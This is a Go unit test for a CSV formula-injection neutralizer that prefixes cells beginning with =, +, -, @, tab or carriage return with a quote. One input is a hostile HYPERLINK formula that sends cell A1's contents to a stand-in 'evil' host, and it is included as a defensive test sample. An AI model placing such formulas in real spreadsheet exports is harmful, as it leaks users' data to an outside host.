package api

import (
	"slices"
	"testing"
)

func TestNeutralizeCSVFormulas(t *testing.T) {
	in := []string{
		`=HYPERLINK("https://evil/?"&A1,"x")`,
		"+1+1",
		"-2+3",
		"@SUM(A1)",
		"\t=1",
		"\r=1",
		"",
		"jdoe",
		"uid=jdoe,ou=People,dc=example,dc=org",
		"2026-10-13T08:00:00Z",
		"a=b",
	}
	want := []string{
		`'=HYPERLINK("https://evil/?"&A1,"x")`,
		"'+1+1",
		"'-2+3",
		"'@SUM(A1)",
		"'\t=1",
		"'\r=1",
		"",
		"jdoe",
		"uid=jdoe,ou=People,dc=example,dc=org",
		"2026-10-13T08:00:00Z",
		"a=b",
	}
	if got := neutralizeCSVFormulas(in); !slices.Equal(got, want) {
		t.Errorf("neutralizeCSVFormulas:\n got %q\nwant %q", got, want)
	}
}
